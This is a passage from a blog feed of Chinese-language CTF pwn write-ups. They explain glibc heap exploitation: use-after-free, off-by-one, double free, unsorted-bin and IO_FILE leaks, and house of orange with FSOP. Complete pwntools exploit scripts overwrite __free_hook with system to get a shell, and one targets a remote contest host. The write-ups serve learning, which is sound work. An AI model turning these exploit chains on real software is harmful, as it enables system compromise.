sh.sendlineafter(&quot;&gt;&gt;\n&quot;, &#39;2&#39;)    sh.sendlineafter(&quot;I:&gt;&gt;\n&quot;, str(idx))    sh.sendlineafter(&quot;V:&gt;&gt;\n&quot;, content)def dp(idx):    sh.sendlineafter(&quot;&gt;&gt;\n&quot;, &#39;3&#39;)    sh.sendlineafter(&quot;I:&gt;&gt;\n&quot;, str(idx))def rm(idx):    sh.sendlineafter(&quot;&gt;&gt;\n&quot;, &#39;4&#39;)    sh.sendlineafter(&quot;I:&gt;&gt;\n&quot;, str(idx))for i in range(9):    ad(i,0x88)for i in range(7,0,-1):    rm(i)rm(0)ad(9,0x78)dp(9)#gdb.attach(sh)leak = u64(sh.recvuntil(&#39;\x7f&#39;)[-6:]+b&#39;\x00\x00&#39;)base = leak - 224 -0x10 - libc.sym[&#39;__malloc_hook&#39;]free = base + libc.sym[&#39;__free_hook&#39;]system = base + libc.sym[&#39;system&#39;]print(hex(leak))print(hex(free))print(hex(system))ad(1,0x88)md(1,b&#39;a&#39;*0x90 + p64(free))ad(2,0x88)md(2,b&#39;/bin/sh\x00&#39;)ad(3,0x88)md(3,p64(system))rm(2)#gdb.attach(sh)sh.interactive()</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近打东华杯，因为看不懂c++，所以遭重了。花了一点时间学习C++的反汇编，终于把它拿捏了。&lt;/p&gt;
&lt;h1 id=&quot;CPP&quot;&gt;&lt;a href=&quot;#CPP&quot; class=&quot;headerlink&quot; title=&quot;CPP&quot;&gt;&lt;/a&gt;CPP&lt;/h1&gt;&lt;p&gt;UAF漏洞，在rm函数中</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>十月二十六日-拟态-PWN</title>
    <link href="http://example.com/2021/10/26/10.24%E6%8B%9F%E6%80%81/"/>
    <id>http://example.com/2021/10/26/10.24%E6%8B%9F%E6%80%81/</id>
    <published>2021-10-26T07:24:01.140Z</published>
    <updated>2021-10-27T17:45:13.163Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pwnpwn"><a href="#pwnpwn" class="headerlink" title="pwnpwn"></a>pwnpwn</h1><p>简单的格式化字符串漏洞由于程序本身会打印一个当前地址，只需要减去当前函数的偏移即可获取elf基地址</p><p>通过格式化字符串漏洞泄露canary</p><p>最后用ROPgadget寻找可用gadget，用ret,劫持执行流，pop rdi ；ret传参”bin/sh”,再进入system函数</p><h1 id="bitfile"><a href="#bitfile" class="headerlink" title="bitfile"></a>bitfile</h1><p>漏洞出现在edit中，因为在读入时多出了一个字符，所以造成了off-by-one 漏洞。</p><p>观察代码，可以先泄露tchec地址，向tcache-&gt;counts[tc_idx]写入7，即填满，然后在通过构造堆重叠泄露出unsortbin，从而进行攻击。</p><pre><code>  v7 = __readfsqword(0x28u);  __printf_chk(1LL, &quot;Index: &quot;);  __isoc99_scanf(&amp;unk_1054, &amp;v6);  v0 = v6;  if ( v6 &lt;= 0x1F )  &#123;    if ( ptrs[v6] )    &#123;      __printf_chk(1LL, &quot;Content: &quot;);      v1 = sizes[v0];      v2 = (_BYTE *)ptrs[v0];      max_size = v1 + 1;      if ( max_size )      &#123;        v4 = &amp;v2[max_size];        do        &#123;          read(0, v2, 1uLL);          if ( *v2 == 10 )            break;          ++v2;        &#125;        while ( v2 != v4 );      &#125;    &#125;  &#125;  return __readfsqword(0x28u) ^ v7;&#125;</code></pre><p>又因为在add函数中限制了chunk的大小，所以我们要通过合并堆从而泄露libc.</p><pre><code>unsigned __int64 add()&#123;  size_t v0; // rbx  size_t size_; // rbp  void *v3; // rax  size_t size; // [rsp+0h] [rbp+0h] BYREF  unsigned __int64 vars8; // [rsp+8h] [rbp+8h]  vars8 = __readfsqword(0x28u);  __printf_chk(1LL, &quot;Index: &quot;);  __isoc99_scanf(&amp;unk_1054, &amp;size);  v0 = size;  if ( size &lt;= 0x1F &amp;&amp; !ptrs[size] )  &#123;    __printf_chk(1LL, &quot;Size: &quot;);    __isoc99_scanf(&amp;unk_1054, &amp;size);    size_ = size;    if ( size &lt;= 0x50 )    &#123;      v3 = malloc(size);      if ( v3 )      &#123;        ptrs[v0] = v3;        sizes[v0] = size_;        puts(&quot;Done!&quot;);      &#125;      else      &#123;        puts(&quot;allocate failed&quot;);      &#125;    &#125;  &#125;  return __readfsqword(0x28u) ^ vars8;&#125;</code></pre><p>申请两个tcache,重新申请一个再泄露出tcache地址，先利用tcache_bin打印出tcache的地址。</p><pre><code>rm(0)md(2,b&#39;A&#39; * 0x48 + p8(0x50 + 0x51))gdb.attach(io)rm(4)              #chunk 3 is 0xa1 ;#gdb.attach(io)ad(0, 0x48)dp(0)ru(&#39;Content: &#39;)leak = u64(ru(&#39;\n&#39;).ljust(8, b&#39;\x00&#39;))  #tcache addrheap = leak - 0x260 + 0x10 + 8   #to chunk first</code></pre><p><img src="https://i.loli.net/2021/10/25/6cjeDorwbLNGY8Z.png"></p><p>通过溢出chunk(5)修改chunk(6)的size，形成堆重叠。将tcache-&gt;counts[tc_idx]的地址写入FD,下下个堆块就会分配到此处。</p><p>将idx设置为7，那么0xa0大小的chunk将会由unsortbin管理</p><pre><code>rm(3)#gdb.attach(io)rm(11) # make 0x50 more lengmd(5,b&#39;B&#39; * 0x28 + p8(0x30 + 0x31))rm(6)rm(7)ad(6, 0x50)md(6, b&#39;A&#39; * 0x28 + p64(0x31) + p64(heap) + b&#39;\n&#39;) ad(3, 0x28)ad(4, 0x28)      #018md(4, p64(7) + b&#39;\n&#39;) # set 0xa0 chunk number as 7#gdb.attach(io)md(8,b&#39;C&#39; * 0x48 + p8(0x50 + 0x51))rm(9)#gdb.attach(io)ad(9, 0x38)dp(9)</code></pre><p>泄露libc， 将chunk(9)的size改为0xa1,形成unsortbin,然后再次malloc，通过打印，并计算出libc基址</p><pre><code>md(8,b&#39;C&#39; * 0x48 + p8(0x50 + 0x51))rm(9)ad(9, 0x38)dp(9)leak = u64(ru(&#39;\x7f&#39;)[-5:] + b&#39;\x7f\x00\x00&#39;)     #libc_base-getlibc_base = leak  - libc.sym[&#39;__malloc_hook&#39;] - 240 - 0x10li(&#39;leak: &#39; + hex(leak))li(&#39;libc_base: &#39; + hex(libc_base)) </code></pre><p>get_shell</p><p>通过同样的方式，溢出修改(13)的size,free(13) free(14)形成堆重叠，再malloc一个chunk使得可以修改(14)的fd 为 __free_hook ，再进行malloc，向__free_hook中写入system 。顺便将一个chunk写入(“/bin/sh\x00”),将其free即可</p><h1 id="old-school-amp-amp-old-school-revenge"><a href="#old-school-amp-amp-old-school-revenge" class="headerlink" title="old_school &amp;&amp; old_school_revenge"></a>old_school &amp;&amp; old_school_revenge</h1><p><img src="https://i.loli.net/2021/10/27/nPBoMijyCeAUf18.png"></p><p>依然是一个off-by-one,但是限制了大小，所以我们需要通过合并堆来形成unsortbin ，从而泄露libc</p><p>先创建若干堆，然后free掉7个填充满tchack</p><pre><code>for i in range(7):    ad(i,0x80)ad(7,0x80)ad(8,0x78)ad(9,0x78)ad(10,0x80)ad(11,0x70)ad(12,0x70)for i in range(7):    rm(i)</code></pre><p>利用chunk(9)来修改chunk(10)的pre_size，然后free(7),free(10)，从而使得7–&gt;10进行合并，之后可以切割unsortbin来进行泄露。</p><p><img src="https://i.loli.net/2021/10/27/8fvnKSTLab9ZCw6.png"></p><pre><code>md(9, &#39;A&#39; * 0x70 + p64(0x90 + 0x80 + 0x80) + &#39;\x90&#39;)rm(9)rm(10)ad(0, 0x60) ad(1, 0x10) dp(8)leak = u64(ru(&#39;\x7f&#39;)[-5:] + &#39;\x7f\x00\x00&#39;)libc_base = leak  - libc.sym[&#39;__malloc_hook&#39;] - 96 - 0x10</code></pre><p>由于之前我们的chunk结构，所以我们选择在chunk(8),chunk(9)进行写入unsortbin。<br>因为chunk(8)的大小为0x78，为了溢出至chunk(9)，我们需要malloc一个大chunk,从而可以修改到chunk(9)的FD</p><p>malloc后，往该堆填入数据直到chunk(9)的FD,写入__free_hook.</p><pre><code>ad(2,0xa0)payload = b&#39;B&#39;*0x80 + p64(__free_hook)+ p64(0) + b&#39;\n&#39;md(2,payload)#gdb.attach(io)ad(4,0x70)md(4,&#39;/bin/sh\x00\n&#39;)ad(5,0x70)md(5,p64(system)+b&#39;\n&#39;)rm(4)</code></pre><p>之后就按照流程进入system即可。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;pwnpwn&quot;&gt;&lt;a href=&quot;#pwnpwn&quot; class=&quot;headerlink&quot; title=&quot;pwnpwn&quot;&gt;&lt;/a&gt;pwnpwn&lt;/h1&gt;&lt;p&gt;简单的格式化字符串漏洞由于程序本身会打印一个当前地址，只需要减去当前函数的偏移即可获取elf基地址&lt;/p&gt;
</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>十月一日 IO_FILE houseOforange</title>
    <link href="http://example.com/2021/10/03/10.1FSOP&amp;orange/"/>
    <id>http://example.com/2021/10/03/10.1FSOP&amp;orange/</id>
    <published>2021-10-03T07:18:43.410Z</published>
    <updated>2022-04-01T07:34:20.612Z</updated>
    
    <content type="html"><![CDATA[<h1 id="十月一日总结-PWN"><a href="#十月一日总结-PWN" class="headerlink" title="十月一日总结-PWN"></a>十月一日总结-PWN</h1><h2 id="IO-FILE泄露glibc"><a href="#IO-FILE泄露glibc" class="headerlink" title="IO_FILE泄露glibc"></a>IO_FILE泄露glibc</h2><p><a href="https://www.lshykx.fun/posts/8601552c/">IO_FILE泄露libc参考文章</a></p><p>首先利用工具查出libc版本，可以看出这是glibc_2.27</p><p><img src="https://i.loli.net/2021/10/03/Tu7vNH5gtBxsnJl.png"></p><p>经过尝试，发现存在double_free漏洞，考虑到没有开启地址随机化保护，而且没有show函数，我们考虑通过IO_FILE泄露libc,</p><pre><code>0x602080 &lt;stdout@@GLIBC_2.2.5&gt;:    0x00007f87b2616161    0x00000000000000000x602090 &lt;stdin@@GLIBC_2.2.5&gt; :    0x00007f87b21eda00    0x00000000000000000x6020a0 &lt;stderr@@GLIBC_2.2.5&gt;:    0x00007f87b21ee680    0x0000000000000000</code></pre><p><img src="https://i.loli.net/2021/10/03/grLcyo4JmhApZUE.png"></p><p>因为&lt;stdout@@GLIBC_2.2.5&gt;:    0x00007fd54dc2a760 这个指针指向被认为了fd所以再次malloc时将从0x00007fd54dc2a760处取得。而我们正好可以修改_IO_2_1_stdout_来实现泄露libc</p><p><img src="https://i.loli.net/2021/10/03/oFCYxjnBT4zbMhp.png"></p><pre><code>payload=p64(0xfdab1800)+p64(0)*3+b&#39;\x00&#39;add(0x60,payload)leak_vtable=u64(io.recvuntil(&quot;exit&quot;)[0x58:0x60])libc_base=leak_vtable-libc.symbols[&quot;_IO_file_jumps&quot;]</code></pre><p>最后再次利用double_free实现get_shell</p><pre><code>add(0x70,&quot;aaa&quot;)dele(5)dele(5)add(0x70,p64(free_hook))add(0x70,b&quot;/bin/sh\x00&quot;)add(0x70,p64(system))#gdb.attach(io)dele(7)</code></pre><p><img src="https://i.loli.net/2021/10/03/qz83b5SKvuaBH2D.png"></p><p>最后exp如下：</p><pre><code>#! /usr/bin/python3from pwn import *io = process(&#39;./IO_FILE&#39;)elf = ELF(&#39;./IO_FILE&#39;)libc = ELF(&quot;./libc.so.6&quot;)context.log_level = &#39;debug&#39;def add (size,des):   io.sendlineafter(&quot;&gt;&quot;,&#39;1&#39;)   io.sendlineafter(&quot;size:&quot;,str(size))   io.sendafter(&quot;ion:&quot;,des)def dele(idx):   io.sendlineafter(&quot;&gt;&quot;,&#39;2&#39;)   io.sendlineafter(&quot;index:&quot;,str(idx))add(0x60,&#39;aaa&#39;)dele(0)dele(0)add(0x60,p64(0x602080))add(0x60,b&#39;\x60&#39;)add(0x60,b&#39;\x60&#39;)payload=p64(0xfdab1800)+p64(0)*3+b&#39;\x00&#39;add(0x60,payload)gdb.attach(io)leak_vtable=u64(io.recvuntil(&quot;exit&quot;)[0x58:0x60])libc_base=leak_vtable-libc.symbols[&quot;_IO_file_jumps&quot;]free_hook=libc_base+libc.symbols[&quot;__free_hook&quot;]system=libc_base+libc.symbols[&quot;system&quot;]print(&quot;leak_vtable---&gt;&quot;+hex(leak_vtable))print(&quot;libc_base-----&gt;&quot;+hex(libc_base))print(&quot;free_hook-----&gt;&quot;+hex(free_hook))print(&quot;system--------&gt;&quot;+hex(system))add(0x70,&quot;aaa&quot;)dele(5)dele(5)add(0x70,p64(free_hook))add(0x70,b&quot;/bin/sh\x00&quot;)add(0x70,p64(system))#gdb.attach(io)dele(7)io.interactive()</code></pre><h2 id="长安杯2-27下的unsortbin-attack"><a href="#长安杯2-27下的unsortbin-attack" class="headerlink" title="长安杯2.27下的unsortbin_attack"></a>长安杯2.27下的unsortbin_attack</h2><pre><code>int creat()&#123;  unsigned int id; // [rsp+0h] [rbp-10h]  int nbytes; // [rsp+4h] [rbp-Ch]  void *content; // [rsp+8h] [rbp-8h]  puts(&quot;idx?&quot;);  id = read_0x10();  if ( id &gt; 0xF )    return puts(&quot;error!&quot;);  puts(&quot;size?&quot;);  nbytes = read_0x10();  size_202060[id] = nbytes;  if ( nbytes &gt; 0x400 )    return puts(&quot;error!&quot;);  content = malloc(nbytes);  if ( !content )    return puts(&quot;error!&quot;);  *(&amp;arr_2020E0 + id) = content;  puts(&quot;content?&quot;);  read(0, *(&amp;arr_2020E0 + id), nbytes);  return puts(&quot;success!&quot;);&#125;</code></pre><p>漏洞出现在这里，分析逻辑可以发现，程序运行时是先将size写入，之后才判断大小，因此存在漏洞，我们可以利用这里来进行泄露。</p><p>我们发现这里没有重复创建堆的判断，因此可以直接创建两个相同的堆。从而达到修改size的目的。</p><p>在首个unsortbin的fd中，存储这mainarea+96,而且其附近(-0x10)就是__malloc_hook，所以我们可以利用其泄露地址。</p><pre><code>creat(7,0x80,&#39;c&#39;*0x80)creat(7,0x500,&#39;D&#39;)edit (7,0x450,&#39;D&#39;*0x90)show (7)#gdb.attach(io)leak = u64(io.recvuntil(&#39;\x7f&#39;,drop = True)[-5:] + b&#39;\x7f\x00\x00&#39;)libc_base = leak - libc.sym[&#39;__malloc_hook&#39;] - 96 - 0x10</code></pre><p>最后修改__free_hook为system并将参数设置为/bin/sh\x00，最最后free即可。</p><p><img src="https://i.loli.net/2021/10/03/avfnj2NebSgWm6i.png"></p><pre><code>delet(0)delet(1)delet(2)delet(8)edit(7, 0x400, b&#39;A&#39; * (0x80) + p64(0) + p64(0x91) + p64(libc_base + libc.sym[&#39;__free_hook&#39;]))creat(0, 0x80, b&#39;/bin/sh\x00&#39;)#gdb.attach(io)creat(1, 0x80, p64(libc_base + libc.sym[&#39;system&#39;]))delet(0)</code></pre><p>exp如下</p><pre><code>#! /usr/bin/python3from pwn import *#io = process(&#39;./main&#39;)io = remote(&quot;113.201.14.253&quot;,21111)elf = ELF(&#39;./main&#39;)libc = ELF(&#39;./libc-2.27.so&#39;)#libc = ELF(&#39;/glibc/2.29/64/lib/libc.so.6&#39;)context.log_level = &#39;debug&#39;import osr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#39;\x1b[01;38;5;214m&#39; + x + &#39;\x1b[0m&#39;)#----------functiondef creat(idx, sz, d):    io.sendlineafter(&#39;&gt;&gt;&#39;, &#39;1&#39;)    io.sendlineafter(&#39;?&#39;, str(idx))    io.sendlineafter(&#39;?&#39;, str(sz))    if(sz &lt;= 0x400):        io.sendafter(&#39;?&#39;, d)def ad(idx, sz, d):    sla(&#39;&gt;&gt;&#39;, &#39;1&#39;)    sla(&#39;?&#39;, str(idx))    sla(&#39;?&#39;, str(sz))    if(sz &lt;= 0x400):        sa(&#39;?&#39;, d)def delet (idx):    sla(&#39;&gt;&gt;&#39;, &#39;2&#39;)    sla(&#39;?&#39;, str(idx))def edit (idx,size,content):    sla(&#39;&gt;&gt;&#39;, &#39;3&#39;)    sla(&#39;?&#39;, str(idx))    sla(&#39;?&#39;, str(size))    sa(&#39;?&#39;, content)def show (idx):    sla(&#39;&gt;&gt;&#39;, &#39;4&#39;)    sla(&#39;?&#39;, str(idx))#---------------for i in range(9):    ad(i, 0x80, &#39;A&#39; * 0x80)for i in range(7):   delet(6-i)delet(7)for i in range(6):   ad(i, 0x80, &#39;A&#39; * 0x80)creat(7,0x80,&#39;c&#39;*0x80)creat(7,0x500,&#39;D&#39;)edit (7,0x450,&#39;D&#39;*0x90)show (7)#gdb.attach(io)leak = u64(io.recvuntil(&#39;\x7f&#39;,drop = True)[-5:] + b&#39;\x7f\x00\x00&#39;)libc_base = leak - libc.sym[&#39;__malloc_hook&#39;] - 96 - 0x10free_hook = libc_base + libc.sym[&#39;__free_hook&#39;]print(&quot;leak-------&gt;&quot;+hex(leak))print(&quot;libc_base--&gt;&quot;+hex(libc_base))print(&quot;free_hook--&gt;&quot;+hex(free_hook))gdb.attach(io)edit (7, 0x400, b&#39;A&#39; * (0x80) + p64(0) + p64(0x91))#gdb.attach(io)creat(8, 0x80, &#39;A&#39; * 0x80)delet(0)delet(1)delet(2)delet(8)edit(7, 0x400, b&#39;A&#39; * (0x80) + p64(0) + p64(0x91) + p64(libc_base + libc.sym[&#39;__free_hook&#39;]))creat(0, 0x80, b&#39;/bin/sh\x00&#39;)#gdb.attach(io)creat(1, 0x80, p64(libc_base + libc.sym[&#39;system&#39;]))delet(0)io.interactive()io.close()</code></pre><h2 id="电信杯2-31unsortbin-attachk"><a href="#电信杯2-31unsortbin-attachk" class="headerlink" title="电信杯2.31unsortbin_attachk"></a>电信杯2.31unsortbin_attachk</h2><p>观察代码，漏洞已经很明显了，使用gets函数导致了可以溢出</p><pre><code>int __fastcall creat(__int64 a1)&#123;  unsigned int i; // [rsp+4h] [rbp-Ch]  void *v3; // [rsp+8h] [rbp-8h]  for ( i = 0; i &lt;= 0x1F &amp;&amp; qword_4060[i]; ++i )    ;  if ( i == 32 )    ((void (__fastcall *)(__int64))sub_12F8)(a1);  v3 = malloc(0x80uLL);  if ( !v3 )  &#123;    puts(&quot;malloc error&quot;);    exit(1);  &#125;  printf(&quot;content: &quot;);  gets(v3);  qword_4060[i] = v3;  return puts(&quot;done&quot;);&#125;</code></pre><p>考虑到我们需要使用unsortbin_attack，但是只能malloc 0x80的chunk,所以需要修改size&gt;0x440,使得其free后可以进入unsortbin。</p><pre><code>delet(0)creat(b&quot;a&quot;*0x88 + p64(0x90*9+1))delet(1)creat(&quot;A&quot;)show(2)#fd =    u64(io.recvuntil(&quot;\x7f&quot;)[-6:]+b&#39;\x00\x00&#39;)leak = u64(io.recvuntil(&#39;\x7f&#39;)[-6:]+b&#39;\x00\x00&#39;)</code></pre><p>此时我们完成了泄露，只需将__free_hook修改为system,参数设置为/bin/sh\x00,然后free即可</p><pre><code>delet(6)delet(5)delet(4)creat(b&quot;a&quot;*0x88 + p64(0x91) + p64(libc.sym[&#39;__free_hook&#39;]))creat(&quot;B&quot;)creat(p64(system_addre))delet(10)</code></pre><p>之前写的比较详细了，这里不在多讲。</p><p>exp如下：</p><pre><code>#! /usr/bin/python3from pwn import *elf = ELF(&#39;./pwn1&#39;)libc = ELF(&#39;/glibc/2.30/64/lib/libc.so.6&#39;)context.log_level = &#39;debug&#39;io = process(&#39;./pwn1&#39;)def creat(data):   io.sendlineafter(&quot;&gt;&gt; &quot;,&#39;1&#39;)   io.sendlineafter(&quot;content: &quot;,data)def show(idx):   io.sendlineafter(&quot;&gt;&gt; &quot;,&#39;3&#39;)   io.sendlineafter(&quot;index: &quot;,str(idx))def delet(idx):   io.sendlineafter(&quot;&gt;&gt; &quot;,&#39;2&#39;)   io.sendlineafter(&quot;index: &quot;,str(idx))for i in range(12): #0-12   creat(b&quot;/bin/sh\x00&quot;)delet(0)creat(b&quot;a&quot;*0x88 + p64(0x90*9+1))delet(1)creat(&quot;A&quot;)show(2)#fd =    u64(io.recvuntil(&quot;\x7f&quot;)[-6:]+b&#39;\x00\x00&#39;)leak = u64(io.recvuntil(&#39;\x7f&#39;)[-6:]+b&#39;\x00\x00&#39;)print(&quot;leak------&gt;&quot;+hex(leak))libc_base = leak - 96 - 0x10 - libc.sym[&#39;__malloc_hook&#39;]print(&quot;libc_base-&gt;&quot;,hex(libc_base))libc.address = libc_basesystem_addre = libc.sym[&#39;system&#39;]delet(6)delet(5)delet(4)creat(b&quot;a&quot;*0x88 + p64(0x91) + p64(libc.sym[&#39;__free_hook&#39;]))creat(&quot;B&quot;)creat(p64(system_addre))delet(10)io.interactive()</code></pre><h2 id="house-Of-orange"><a href="#house-Of-orange" class="headerlink" title="house_Of_orange"></a>house_Of_orange</h2><p>本题需要利用house_of_orange获得free_chunk , 然后再利用FSOP劫持程序执行流。</p><p>分析程序可以发现，在upgrade函数中会重新获取name的大小，因此这里存在溢出漏洞</p><p><img src="https://i.loli.net/2021/10/18/2aQENgxkKwc1U3A.png"></p><p>然而，本程序并没有free功能，因此引出了house_of_orange技术。</p><p>可以通过溢出来修改top_chunk的size域，然后malloc一个大堆块，使得系统调用sysmalloc，</p><p><strong>注意topchunk要对齐4kb 及 低位为0x1000</strong></p><p>如果所需分配的 chunk 大小大于 mmap 分配阈值（默认为 128K，0x20000），就会调用mmap。<br>然后top_chunk就会进入unsorted bin ， 从而实现free的功能。</p><p>那么我们如何劫持程序流呢？这里就引出了FSOP</p><p>注意，在2.23之后就无法在目标地址写入了。</p><p>在libc的_IO_list_all中，存放有一个_IO_FILE_plus结构体的指针，<br>如下图，它指向_IO_2_1_stderr_：</p><p><img src="https://img-blog.csdnimg.cn/20200427101745159.png"></p><p>而_IO_FILE_plus结构体详细内容如下</p><p><img src="https://img-blog.csdnimg.cn/20200427101902924.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDE0NTgyMA==,size_16,color_FFFFFF,t_70"></p><p>其中_chain指向下一个_IO_FILE_plus结构体</p><p>在malloc中，它调用malloc_printerr来打印错误，经过一系列调用，最终来到_IO_flush_all_lockp：</p><pre><code>while (fp != NULL)&#123;…    fp = fp-&gt;_chain;    ...          if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T       || (_IO_vtable_offset (fp) == 0           &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))#endif       )      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</code></pre><p>如果满足以下条件：</p><pre><code>fp-&gt;_mode &gt; 0_IO_vtable_offset (fp) == 0fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</code></pre><p>因此可以伪造一个_IO_FILE_plus , 从而满足这些条件</p><p>1.创建一个chunk,并溢出修改top_chunk的size . 使top_chunk满足house_of_orange的条件</p><p>2.malloc一个大堆块，使得调用sysmalloc 并使得top_chunk进入unsorted bin ，然后再malloc一个chunk，这是为了切割top_chunk，使其信息残留在新的chunk中，从而泄露地址。之后show()，计算出__malloc_hook 即可。</p><p><img src="https://i.loli.net/2021/10/18/6lxZ7uKOAzIYVhC.png"></p><p>3.</p><p>为了再次泄露出堆的地址，我们再次编辑堆，然后show泄露残留的信息（fd,bk）,并通过偏移计算出heap_base</p><p><img src="https://i.loli.net/2021/10/18/39qYpynl18wKOmQ.png"></p><p>4.之后伪造_IO_FILE_plus和一个fake_chuk</p><pre><code>payload = b&#39;a&#39; * 0x400 + p64(0) + p64(0x21) + p64(0) + p64(0)fake_file = b&#39;/bin/sh\x00&#39;+p64(0x61)#to small binfake_file += p64(0)+p64(io_list_all-0x10)  fake_file += p64(0) + p64(1)#_IO_write_base &lt; _IO_write_ptrfake_file = fake_file.ljust(0xc0,b&#39;\x00&#39;)fake_file += p64(0) * 3fake_file += p64(heap_base+0x5E8) #vtable ptrfake_file += p64(0) * 2fake_file += p64(system)payload += fake_fileedit(len(payload), payload, 666, 2)</code></pre><p>溢出修改堆并使其原top_chunk作为 fake_IO_FILE_plus</p><p><img src="https://i.loli.net/2021/10/18/E5CP8vYewWcpK7u.png"></p><p>再次malloc，触发错误，获得shell<br>malloc时，对unsorted bin进行判断，此时该chunk的size为0x61，不满足要求，就把该chunk放入small bin，并且向bk-&gt;fd写入main_arena+0x58，即向_IO_list_all写入main_arena+0x58<br>此时判断下一个unsorted bin（_IO_list_all），而这里实际上没有chunk，此时会触发错误<br>此时第一个_IO_FILE_plus结构体为main_arena+0x58，而它不满足条件，就通过_chain调到下一个_IO_FILE_plus结构体，_chain位于0x68偏移的地方，main_arena+0x58+0x68=main_arena+0xc0，就是small bin中0x60大小的地方，这就回到了我们伪造的_IO_FILE_plus结构体</p><p><img src="https://i.loli.net/2021/10/18/3h8UAgDJ6t5OWcM.gif"></p><p>在构造出smal bin的时候</p><p>small bin的头节点会储存在main_arena中</p><p>控制大小为0x60的时候，刚好头部地址储存对应 chain这个位置</p><p>EXP :</p><pre><code>#! /usr/bin/python3from pwn import *from LibcSearcher import *#r = remote(&quot;node4.buuoj.cn&quot;,29449)r = process(&quot;./houseoforange_hitcon_2016&quot;)context.log_level = &#39;debug&#39;elf = ELF(&quot;./houseoforange_hitcon_2016&quot;)libc = elf.libcdef add(size, content, price, color):    r.recvuntil(&quot;Your choice : &quot;)    r.sendline(&#39;1&#39;)    r.recvuntil(&quot;Length of name :&quot;)    r.sendline(str(size))    r.recvuntil(&quot;Name :&quot;)    r.send(content)    r.recvuntil(&quot;Price of Orange:&quot;)    r.sendline(str(price))    r.recvuntil(&quot;Color of Orange:&quot;)    #1-7    r.sendline(str(color))def show():    r.recvuntil(&quot;Your choice : &quot;)    r.sendline(&#39;2&#39;)def edit(size, content, price, color):    r.recvuntil(&quot;Your choice : &quot;)    r.sendline(&#39;3&#39;)    r.recvuntil(&quot;Length of name :&quot;)    r.sendline(str(size))    r.recvuntil(&quot;Name:&quot;)    r.send(content)    r.recvuntil(&quot;Price of Orange:&quot;)    r.sendline(str(price))    r.recvuntil(&quot;Color of Orange:&quot;)    #1-7    r.sendline(str(color))add(0x30,&#39;aaaa\n&#39;,0x1234,0xddaa)payload = b&#39;a&#39; * 0x30 +p64(0) + p64(0x21) + p32(666) + p32(0xddaa) + p64(0) * 2 + p64(0xf81)edit(len(payload), payload, 666, 0xddaa)add(0x1000, &#39;a\n&#39;,0x1234, 0xddaa)add(0x400, &#39;a&#39; * 8, 199, 2)show()r.recvuntil(&#39;a&#39;*8)malloc_hook = u64(r.recvuntil(&#39;\x7f&#39;).ljust(8, b&#39;\x00&#39;)) - 0x668 - 0x10success(&#39;malloc_hook = &#39;+hex(malloc_hook))libc.address = malloc_hook - libc.symbols[&#39;__malloc_hook&#39;]io_list_all = libc.symbols[&#39;_IO_list_all&#39;]system = libc.symbols[&#39;system&#39;]print(&quot;libc.address--&gt;&quot;,hex(libc.address))print(&quot;io_list_all---&gt;&quot;,hex(io_list_all))print(&quot;system--------&gt;&quot;,hex(system))payload = &#39;b&#39; * 0x10edit(0x10, payload, 199, 2)show()r.recvuntil(&#39;b&#39;*0x10)heap = u64(r.recvuntil(&#39;\n&#39;).strip().ljust(8, b&#39;\x00&#39;))heap_base = heap - 0xE0success(&#39;heap = &#39;+hex(heap))#pause()payload = b&#39;a&#39; * 0x400 + p64(0) + p64(0x21) + p32(666) + p32(0xddaa) + p64(0)fake_file = b&#39;/bin/sh\x00&#39;+p64(0x61)#to small binfake_file += p64(0)+p64(io_list_all-0x10)fake_file += p64(0) + p64(1)#_IO_write_base &lt; _IO_write_ptrfake_file = fake_file.ljust(0xc0,b&#39;\x00&#39;)fake_file += p64(0) * 3fake_file += p64(heap_base+0x5E8) #vtable ptrfake_file += p64(0) * 2fake_file += p64(system)payload += fake_fileedit(len(payload), payload, 666, 2)#pause()r.recvuntil(&quot;Your choice : &quot;)r.sendline(&#39;1&#39;)r.interactive()</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;十月一日总结-PWN&quot;&gt;&lt;a href=&quot;#十月一日总结-PWN&quot; class=&quot;headerlink&quot; title=&quot;十月一日总结-PWN&quot;&gt;&lt;/a&gt;十月一日总结-PWN&lt;/h1&gt;&lt;h2 id=&quot;IO-FILE泄露glibc&quot;&gt;&lt;a href=&quot;#IO-FILE</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ctf-wiki</title>
    <link href="http://example.com/2021/09/24/ctf-wiki/"/>
    <id>http://example.com/2021/09/24/ctf-wiki/</id>
    <published>2021-09-24T06:44:56.985Z</published>
    <updated>2021-09-24T06:49:36.303Z</updated>
    
